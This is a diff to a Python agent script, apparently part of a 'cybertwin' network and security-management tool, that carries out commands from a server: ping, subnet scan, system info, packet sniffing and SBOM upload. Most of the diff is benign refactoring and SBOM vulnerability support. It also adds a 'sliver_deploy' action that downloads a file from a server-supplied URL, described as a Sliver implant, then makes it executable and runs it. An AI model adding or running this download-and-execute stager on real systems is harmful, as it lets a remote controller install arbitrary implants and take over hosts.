@@ -59,6 +59,31 @@ def http_get_json(url, headers=None):
 
 
 # ---- System info ----
+def ping_host(target, count=1, timeout_ms=1000):
+    system = platform.system().lower()
+    if system == "windows":
+        cmd = ["ping", "-n", str(count), "-w", str(timeout_ms), target]
+    else:
+        timeout_s = max(1, int((timeout_ms + 999) / 1000))
+        cmd = ["ping", "-c", str(count), "-W", str(timeout_s), target]
+
+    result = subprocess.run(cmd, capture_output=True, text=True)
+    if result.returncode != 0:
+        return False, None, (result.stdout or "") + (result.stderr or "")
+
+    latency = None
+    for line in result.stdout.splitlines():
+        match = re.search(r"time[=<]?\s*([0-9.]+)\s*ms", line, re.I)
+        if match:
+            try:
+                latency = float(match.group(1))
+            except (TypeError, ValueError):
+                latency = None
+            break
+
+    return True, latency, result.stdout
+
+
 def get_system_info():
     return {
         "agent_id": AGENT_ID,
@@ -417,10 +442,15 @@ def handle_command(cmd):
     print(f"[command] received: {cmd}")
 
     if action == "ping":
-        # Linux ping; adjust for Windows if needed
         target = parameters.get("target") or "8.8.8.8"
-        result = subprocess.run(["ping", "-c", "2", target], capture_output=True, text=True)
-        return_output(cmd_id, result.stdout)
+        ok, latency, output = ping_host(target, count=2, timeout_ms=2000)
+        if ok:
+            if latency is not None:
+                return_output(cmd_id, f"ping ok: {target} ~{latency:.2f} ms\n{output}")
+            else:
+                return_output(cmd_id, output)
+        else:
+            return_output(cmd_id, f"ping failed: {target}\n{output}")
     elif action == "scan":
         cidr = parameters.get("cidr")
         max_hosts = parameters.get("max_hosts")
@@ -437,15 +467,8 @@ def handle_command(cmd):
             for ip in ipaddress.ip_network(cidr, strict=False).hosts():
                 if max_hosts_val and count >= max_hosts_val:
                     break
-                result = subprocess.run(["ping", "-c", "1", "-W", "1", str(ip)], capture_output=True, text=True)
-                if result.returncode == 0:
-                    latency = None
-                    for line in result.stdout.splitlines():
-                        if "time=" in line:
-                            try:
-                                latency = float(line.split("time=")[-1].split()[0])
-                            except Exception:
-                                latency = None
+                ok, latency, _ = ping_host(str(ip), count=1, timeout_ms=1000)
+                if ok:
                     hosts.append({"ip": str(ip), "latency_ms": latency})
                 count += 1
 
@@ -482,6 +505,58 @@ def handle_command(cmd):
         return_output(cmd_id, "network metadata posted" if ok else "network metadata failed")
     elif action == "info":
         return_output(cmd_id, json.dumps(get_system_info(), indent=2))
+    elif action == "sliver_deploy":
+        url = parameters.get("url")
+        file_name = parameters.get("file_name") or "sliver_implant.bin"
+        expected_sha = parameters.get("sha256")
+        execute_after = bool(parameters.get("execute"))
+        execute_args = parameters.get("execute_args") or []
+        if isinstance(execute_args, str):
+            execute_args = execute_args.split()
+        if not url:
+            return_output(cmd_id, "sliver_deploy failed: url missing")
+            return
+
+        try:
+            base_dir = os.path.expanduser("~/.cybertwin/sliver_artifacts")
+            os.makedirs(base_dir, exist_ok=True)
+            dest_path = os.path.join(base_dir, file_name)
+
+            res = requests.get(url, timeout=REQ_TIMEOUT, stream=True)
+            if res.status_code != 200:
+                return_output(cmd_id, f"sliver_deploy failed: http {res.status_code}")
+                return
+
+            with open(dest_path, "wb") as handle:
+                for chunk in res.iter_content(chunk_size=1024 * 256):
+                    if chunk:
+                        handle.write(chunk)
+
+            if expected_sha:
+                import hashlib
+                digest = hashlib.sha256()
+                with open(dest_path, "rb") as handle:
+                    for chunk in iter(lambda: handle.read(1024 * 256), b""):
+                        digest.update(chunk)
+                actual_sha = digest.hexdigest()
+                if actual_sha != expected_sha:
+                    return_output(cmd_id, f"sliver_deploy failed: sha256 mismatch ({actual_sha})")
+                    return
+            exec_note = ""
+            if execute_after:
+                try:
+                    os.chmod(dest_path, 0o700)
+                except Exception:
+                    pass
+                try:
+                    proc = subprocess.Popen([dest_path] + list(execute_args))
+                    exec_note = f" (executed pid={proc.pid})"
+                except Exception as e:
+                    exec_note = f" (execute failed: {e})"
+
+            return_output(cmd_id, f"sliver_deploy saved to {dest_path}{exec_note}")
+        except Exception as e:
+            return_output(cmd_id, f"sliver_deploy failed: {e}")
     else:
         return_output(cmd_id, f"Unknown action: {action}")
 
@@ -499,7 +574,7 @@ def return_output(cmd_id, output):
 
 
 # ---- SBOM ----
-def post_sbom_to_server(sbom_data, server_url=None, agent_id="unknown"):
+def post_sbom_to_server(sbom_data, server_url=None, agent_id="unknown", vulnerabilities=None):
     """
     server_url:
       - If None, posts to f"{SERVER_URL}/sbom"
@@ -510,7 +585,10 @@ def post_sbom_to_server(sbom_data, server_url=None, agent_id="unknown"):
         "X-Agent-ID": agent_id,
         "X-Timestamp": datetime.utcnow().isoformat() + "Z"
     }
-    res = http_post_json(target, sbom_data, headers=headers)
+    payload = sbom_data
+    if vulnerabilities:
+        payload = {"sbom": sbom_data, "vulnerabilities": vulnerabilities}
+    res = http_post_json(target, payload, headers=headers)
     if res is None:
         print("[sbom] Failed to post (request failed)")
     else:
@@ -658,6 +736,7 @@ if __name__ == "__main__":
     sbom_parser.add_argument("--output", "-o", help="Write SBOM to a file")
     sbom_parser.add_argument("--format", "-f", choices=["raw", "cyclonedx"], default="raw", help="SBOM output format")
     sbom_parser.add_argument("--sbom-url", help="Override SBOM POST URL (default: <server>/sbom)")
+    sbom_parser.add_argument("--vuln-file", help="Optional JSON file with vulnerabilities (e.g., Grype/Trivy output)")
     sniff_parser = subparsers.add_parser("sniff", help="Sniff packets on interface")
     sniff_parser.add_argument("--interface", "-i", required=True, help="Interface to sniff on")
     subparsers.add_parser("path", help="Run Dijkstra to find shortest latency path interactively")
@@ -687,13 +766,20 @@ if __name__ == "__main__":
     elif args.command == "sbom":
         packages = collect_packages()
         sbom = generate_cyclonedx_sbom(packages) if args.format == "cyclonedx" else packages
+        vulnerabilities = None
+        if args.vuln_file:
+            try:
+                with open(args.vuln_file, "r") as f:
+                    vulnerabilities = json.load(f)
+            except Exception as e:
+                print(f"[sbom] Failed to load vuln file: {e}")
         if args.output:
             with open(args.output, "w") as f:
                 json.dump(sbom, f, indent=2)
             print(f"[sbom] SBOM written to {args.output}")
         else:
             print(json.dumps(sbom, indent=2))
-        post_sbom_to_server(sbom_data=sbom, server_url=args.sbom_url, agent_id=AGENT_ID)
+        post_sbom_to_server(sbom_data=sbom, server_url=args.sbom_url, agent_id=AGENT_ID, vulnerabilities=vulnerabilities)
     elif args.command == "sniff":
         sniff_interface(args.interface)
     elif args.command == "path":
